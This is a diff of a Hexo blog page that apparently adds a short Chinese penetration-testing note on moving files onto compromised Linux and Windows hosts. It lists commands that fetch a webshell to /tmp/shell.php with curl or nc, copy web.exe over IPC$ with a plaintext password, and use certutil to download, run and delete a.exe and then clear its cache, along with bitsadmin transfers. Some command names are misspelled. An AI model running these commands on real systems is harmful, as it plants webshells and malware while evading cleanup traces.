@@ -8,7 +8,7 @@
     <link rel="apple-touch-icon" sizes="76x76" href="/null">
     <link rel="icon" type="image/png" href="/null">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
-    <title>归档 - Hexo</title>
+    <title>系统中文件的传输 - Hexo</title>
     
     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
     
@@ -404,59 +404,72 @@ header .header__right .dropdown-menus .dropdown-menu {
             
 
 <article class="page">
-  <div class="archive-list">
-    <p class="h4">共计 16 篇文章</p>
-    <hr>
+<div id="post-meta-m">
+    <div class="post-meta" id="post-meta">
+  <h3>系统中文件的传输</h3>
     
-    
-      
-        
-        <p class="h5">2022</p>
-      
-      <a href="/2022/03/29/sqlmap/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">sqlmap</span>
-        <time style="float: right;">03-29</time>
-      </a>
-    
-      
-      <a href="/2022/03/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8F%92%E4%BB%B6/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">渗透测试插件</span>
-        <time style="float: right;">03-21</time>
-      </a>
-    
-      
-      <a href="/2022/03/15/mysql/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">mysql</span>
-        <time style="float: right;">03-15</time>
-      </a>
-    
-      
-      <a href="/2022/03/14/PHP/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">PHP</span>
-        <time style="float: right;">03-14</time>
-      </a>
-    
-      
-      <a href="/2022/03/14/Linux/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">Linux</span>
-        <time style="float: right;">03-14</time>
-      </a>
-    
-      
-      <a href="/2022/03/08/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" class="list-group-item list-group-item-action">
-        <span class="archive-post-title">第一篇博客</span>
-        <time style="float: right;">03-08</time>
-      </a>
-    
-
-    <nav aria-label="navigation">
-      <span class="pagination" id="pagination">
-        <a class="extend prev" rel="prev" href="/archives/">&lt;</a><a class="page-number" href="/archives/">1</a><span class="page-number current">2</span>
+      <span class="post-meta-label">
+        John Doe
       </span>
-    </nav>
+    
+    
+      <span class="post-meta-label">
+        <span class="p-dot"></span>
+        <time datetime="2022-06-06 10:13" pubdate>
+          2022-06-06
+        </time>
+      </span>
+    
+    
+      
+      <span class="post-meta">
+        <span class="p-dot"></span>
+        共 274 字
+      </span>
+    
+    
+    
+  </div>
+  
+</div>
+<div class="article-m">
+  <div class="post-toc">
+    
+      
+    
+  </div>
+    <div id="article">
+      <div id="post-content" class="markdown-body textretty">
+        <p>系统中文件的传输</p>
+<p> 一般写文件的位置：<br>  windows   c:\windows\temp<br>  linux   /tmp<br> 搭建简易WEB服务器：<br>  除了WAMP、LAMP、WNMP、lnmp之外<br>  php -S 0.0.0.0:8090<br>  python2 -m SimpleHTTPServer 8090<br>  python3 -m http.serverr 9090</p>
+<p> 常见的写文件方法：<br>  linux<br>   wget <a target="_blank" rel="noopener" href="http://192.168.1.1/w.txt">http://192.168.1.1/w.txt</a><br>   curl <a target="_blank" rel="noopener" href="http://192.168.1.1/w.txt">http://192.168.1.1/w.txt</a> -o /tmp/shell.php<br>   axal <a target="_blank" rel="noopener" href="http://192.168.1.1/w.txt">http://192.168.1.1/w.txt</a><br>   aria2 <a target="_blank" rel="noopener" href="http://192.168.1.1/w.txt">http://192.168.1.1/w.txt</a><br>   攻击机：cat webshell.php|nc -l 1234<br>   目标机：nc 攻击机_ip 1234 &gt; /tmp/webconf.php<br>   ftp linux_server_ip<br>   等等<br>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">windows</span><br><span class="line"> IPC$: </span><br><span class="line">  net use \\192.168.10.104\c$ &quot;123.com&quot; /user:admin</span><br><span class="line">  copy web.exe \\192.168.10.104\c$</span><br><span class="line"> powershell</span><br><span class="line">  $p = New-Object System.Net.WebClient </span><br><span class="line">  $p.DownloadFile(&quot;http://domain/file&quot; &quot;C:\%homepath%\file&quot;) </span><br><span class="line"> certuil</span><br><span class="line">  certutil -urlcache -split -f http://192.168.254.102:80/a a.exe &amp;&amp; a.exe &amp;&amp;  del a.exe &amp;&amp; certutil -urlcache -split -f http://192.168.254.102:80/a delete </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  http://192.168.10.103/top1000.txt</span><br><span class="line">  certutil -urlcache -split -f http://192.168.10.103/top1000.txt 1000.txt </span><br><span class="line"></span><br><span class="line"> bitsadmin</span><br><span class="line">  bitsadmin /rawreturn /transfer getfile http://192.168.3.1/test.txt E:\file\test.txt</span><br><span class="line"></span><br><span class="line">  bitsadmin /rawreturn /transfer getfile http://192.168.10.103/top1000.txt c:\windows\temp\top.txt </span><br><span class="line">  (需要将要传输的文件放在apache服务器中)</span><br><span class="line"> 等等</span><br></pre></td></tr></table></figure></p>
+
+      </div>
+    </div>
+</div>
+
+
+<div class="post-footer">
+  
+  <div class="donate text-center">
+    <span></span>
+    <div class="donate-way">
+      
+    </div>
+  </div>
+  
 
 </div>
+
+    <!-- Comments -->
+    <div class="comments">
+        
+        
+    </div>
+
 </article>
+
+
         </div>
         
 <footer class="text-center">
@@ -473,6 +486,8 @@ header .header__right .dropdown-menus .dropdown-menu {
 </footer>
 
 <div class="p-btn">
+    
+        <a class="toc-btn" id="toc-btn"><i id="i-menu"></i></a>
     
     <a href="#top" class="click-btn">
       <i id="i-up"></i>
@@ -508,8 +523,50 @@ header .header__right .dropdown-menus .dropdown-menu {
 </script>
 
 
+<script>
+    var postImg = document.querySelectorAll("article[class=page] img");
+    for (let imgi = 0; imgi < postImg.length; imgi++) {
+        postImg[imgi].onclick = () => {
+            let zoomImg = document.createElement("div");
+            zoomImg.id = "zoomImg";
+            zoomImg.innerHTML = `<div id="zoom-picture"></div>
+    <div class="poptrox-overlay"
+        style="position: fixed; left: 0px; top: 0px; z-index: 20000; width: 100%; height: 100%; text-align: center; cursor: zoom-out; opacity: 1;">
+        <div style="display:inline-block;height:100%;vertical-align:middle;"></div>
+        <div
+            style="position:absolute;left:0;top:0;width:100%;height:100%;background:#000000;opacity:0;filter:alpha(opacity=0);">
+        </div>
+        <div class="poptrox-popup"
+            style="display: inline-block; vertical-align: middle; position: relative; z-index: 1; cursor: zoom-out; min-width: 10px; min-height: 10px; width: auto; height: auto;">
+            <div class="loader" style="display: none;"></div>
+            <div class="pic" style="text-indent: 0px;"><img
+                    src="${ postImg[imgi].srcset || postImg[imgi].src }" alt="Loading..."
+                    style="vertical-align: bottom; max-width: 85vw; max-height: 85vh;"></div>
+        </div>
+    </div>`;
+            document.body.appendChild(zoomImg);
+                document.querySelector("#zoomImg").onclick = () => {
+                    document.querySelector("#zoomImg").remove();
+                }
+        }
+    }
+    
+</script>
 
 
+
+
+    <script>
+        query("#toc-btn")[0].onclick = () => {
+            if (query(".post-toc")[0].innerHTML) {
+                toggleClass(".post-toc", "display-inline");
+            }
+        }
+
+        if (!query(".post-toc")[0].innerHTML) {
+            addClass("#toc-btn","display-none");
+        }
+    </script>
 
 
 
